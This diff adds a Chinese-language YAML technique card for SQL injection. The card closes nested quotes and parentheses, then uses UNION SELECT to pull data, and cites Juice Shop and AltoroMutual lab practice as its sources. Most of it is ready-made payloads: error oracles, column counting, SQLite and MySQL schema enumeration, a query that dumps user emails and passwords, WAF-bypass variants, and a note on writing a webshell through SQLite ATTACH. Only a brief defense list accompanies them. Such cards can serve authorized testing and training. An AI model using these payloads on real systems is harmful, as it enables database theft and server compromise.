@@ -1,0 +1,95 @@
+# 技术卡片: SQLi - 嵌套引号闭合 + UNION
+# 分类: sqli / nested-union
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: Juice Shop 实战 + AltoroMutual
+
+id: "sqli-nested-quote-union"
+name: "SQLi 嵌套引号闭合 + UNION 数据提取"
+category: "sqli"
+subcategory: "nested-union"
+severity: "critical"
+
+description: |
+  目标 SQL 查询使用了嵌套括号和引号包裹用户输入。
+  使用 ')) 闭合外层结构，配合 -- 注释剩余查询，
+  再 UNION SELECT 提取任意表数据。
+
+trigger_signals:
+  - "输入单引号返回 500/SQL 错误"
+  - "输入两个单引号 '' 恢复正常"
+  - "输入 '))-- 恢复正常（嵌套闭合）"
+  - "应用使用 SQLite/MySQL 后端"
+  - "Node.js Express + SQLite 栈"
+
+payloads:
+  step1_oracle:
+    - probe: "'"
+      expected: "HTTP 500 / SQL error"
+      note: "确认注入点存在"
+    - probe: "''"
+      expected: "HTTP 200 / 正常响应"
+      note: "确认单引号闭合有效"
+    - probe: "'))--"
+      expected: "HTTP 200 / 正常响应"
+      note: "测试嵌套括号闭合"
+
+  step2_union_detect:
+    - probe: "')) UNION SELECT 1,2,3,4,5,6,7,8,9--"
+      note: "先试9列，失败则增减列数"
+    - probe: "')) ORDER BY 5--"
+      note: "二分法探测列数"
+
+  step3_schema_enumeration:
+    sqlite:
+      - payload: >
+          ')) UNION SELECT 1,tbl_name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
+        note: "列出所有用户表"
+      - payload: >
+          ')) UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE tbl_name='Users'--
+        note: "获取表结构"
+    mysql:
+      - payload: >
+          ')) UNION SELECT 1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables--
+      - payload: >
+          ')) UNION SELECT 1,column_name,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_name='users'--
+
+  step4_data_extraction:
+    - payload: >
+        ')) UNION SELECT 1,id||':'||email||':'||password,3,4,5,6,7,8,9 FROM Users--
+      note: "拼接多列到单个输出列"
+
+success_indicators:
+  - "'))-- 恢复正常响应"
+  - "UNION SELECT 返回预期列数"
+  - "sqlite_master/information_schema 返回表名"
+  - "目标表数据成功提取"
+
+prerequisites:
+  - "SQL 查询使用嵌套括号包裹用户输入"
+  - "应用返回查询结果（非盲注）"
+  - "UNION SELECT 列数可匹配"
+  - "数据库为 SQLite 或 MySQL"
+
+bypass_variations:
+  - "')-- : 单层括号闭合"
+  - "')))-- : 三层括号闭合"
+  - "') OR 1=1-- : 布尔绕过（不提取数据）"
+  - "')) OR 1=1-- : 嵌套 + 布尔绕过"
+  - "'))/**/UNION/**/SELECT... : WAF 空格绕过"
+
+upgrade_paths:
+  - "布尔盲注: 无 UNION 回显时使用 SUBSTR 逐字符"
+  - "时间盲注: 无响应差异时使用 SLEEP/pg_sleep"
+  - "写文件: SQLite attach database + 写 webshell"
+
+defense:
+  - "参数化查询 (PreparedStatement)"
+  - "输入验证 + 白名单"
+  - "最小权限数据库账户"
+  - "禁用详细错误回显"
+
+sources:
+  - case: "20260721-juice-shop-full"
+  - ref: "OWASP Juice Shop SQLi"
+  - ref: "PayloadsAllTheThings: SQLite Injection"
